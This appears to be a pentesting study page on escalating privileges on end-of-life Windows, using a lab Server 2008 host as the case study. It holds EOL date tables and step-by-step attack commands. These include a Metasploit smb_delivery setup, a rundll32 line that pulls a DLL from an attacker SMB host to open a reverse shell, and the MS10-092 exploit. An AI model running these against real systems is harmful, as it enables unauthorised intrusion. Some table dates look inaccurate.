---
title: Windows- End of Life Systems
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - privilege
  - escalation
  - windows
---
# Windows: End of Life Systems

Over time, Microsoft decides to no longer offer ongoing support for specific operating system versions. When they stop supporting a version of Windows, they stop releasing security updates for the version in question.

| Version                 | Date              |
| ----------------------- | ----------------- |
| Windows XP              | April 8, 2014     |
| Windows Vista           | April 11, 2017    |
| Windows 7               | January 14, 2020  |
| Windows 8               | January 12, 2016  |
| Windows 8.1             | January 10, 2023  |
| Windows 10 release 1507 | May 9, 2017       |
| Windows 10 release 1703 | October 9, 2018   |
| Windows 10 release 1809 | November 10, 2020 |
| Windows 10 release 1903 | December 8, 2020  |
| Windows 10 release 1909 | May 11, 2021      |
| Windows 10 release 2004 | December 14, 2021 |
| Windows 10 release 20H2 | May 10, 2022      |


#### Windows Server - EOL Dates by Version

| Version                | Date             |
| ---------------------- | ---------------- |
| Windows Server 2003    | April 8, 2014    |
| Windows Server 2003 R2 | July 14, 2015    |
| Windows Server 2008    | January 14, 2020 |
| Windows Server 2008 R2 | January 14, 2020 |
| Windows Server 2012    | October 10, 2023 |
| Windows Server 2012 R2 | October 10, 2023 |
| Windows Server 2016    | January 12, 2027 |
| Windows Server 2019    | January 9, 2029  |


[More details from Microsoft](https://michaelspice.net/windows/end-of-life-microsoft-windows-and-office/). 

In some instances, it is difficult or impossible for an organization to upgrade or retire an end-of-life system due to cost and personnel constraints.

## Windows Server: Server 2008 Case Study

For an older OS like Windows Server 2008, we can use:

- an enumeration script like [Sherlock](sherlock.md) to look for missing patches.
- [Windows-Exploit-Suggester](https://github.com/amandaguglieri/Windows-Exploit-Suggester), which takes the results of the `systeminfo` command as an input, and compares the patch level of the host against the Microsoft vulnerability database to detect potential missing patches on the target.

List existing windows updates:

```cmd-session
wmic qfe
```


#### Running Sherlock


```powershell
Set-ExecutionPolicy bypass -Scope process

Import-Module .\Sherlock.ps1

Find-AllVulns
```

**Obtaining a Meterpreter Shell**: From the output, we can see several missing patches. From here, let's get a Metasploit shell back on the system and attempt to escalate privileges using one of the identified CVEs.

First, we need to obtain a `Meterpreter` reverse shell. We can do this several ways, but one easy way is using the `smb_delivery` module.

```bash
# From our kali attacking machine
msfconsole -q
search smb_delivery
use 0
show options
set target 0
setg LHOST 10.10.14.33
set SRVHOST 10.10.14.33
set LPORT 3333
```

Output:

```
rundll32.exe \\10.10.14.33\lanb\test.dll,0
```

Now we run from the windows host target:

```powershell
rundll32.exe \\10.10.14.33\lanb\test.dll,0
```

And we will receive the reverse shell. Send to the background:

```
bg
```


#### Searching for Local Privilege Escalation Exploit

From here, let's search for the [MS10_092 Windows Task Scheduler '.XML' Privilege Escalation](https://www.exploit-db.com/exploits/19930) module.

```bash
# FRom our attacking machine, we send the session to the background and search for the new exploit:
search 2010-3338
use 0
show options
```

**Migrating to a 64-bit Process**: Before using the module in question, we need to hop into our Meterpreter shell and migrate to a 64-bit process, or the exploit will not work. We could have also chosen an x64 Meterpeter payload during the smb_delivery step.

```shell-session
sessions -i 1

# Now we are in the meterpreter
getpid
ps
```

Output:

```
...SNIP...

 2796  2632  conhost.exe        x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\conhost.exe
 2876  476   svchost.exe
 3048  476   svchost.exe
 ... SNIP ...
```

We will migrate to the process with 64-bit process:

```bash
migrate 2796
```

Output:

```
[*] Migrating from 2268 to 2796...
[*] Migration completed successfully.
```

Send to background and continue the configuration:

```
background
set SESSION 1
set LPORT 4443
exploit

# You may also need to
set ForceExploit true
```



## Windows Desktop Versions: Windows 7 Case Study

Let's look at a Windows 7 host that we may uncover in one of the sectors mentioned above. For our Windows 7 target, we can use `Sherlock` again like in the Server 2008 example, but let's take a look at [Windows-Exploit-Suggester](https://github.com/amandaguglieri/Windows-Exploit-Suggester)

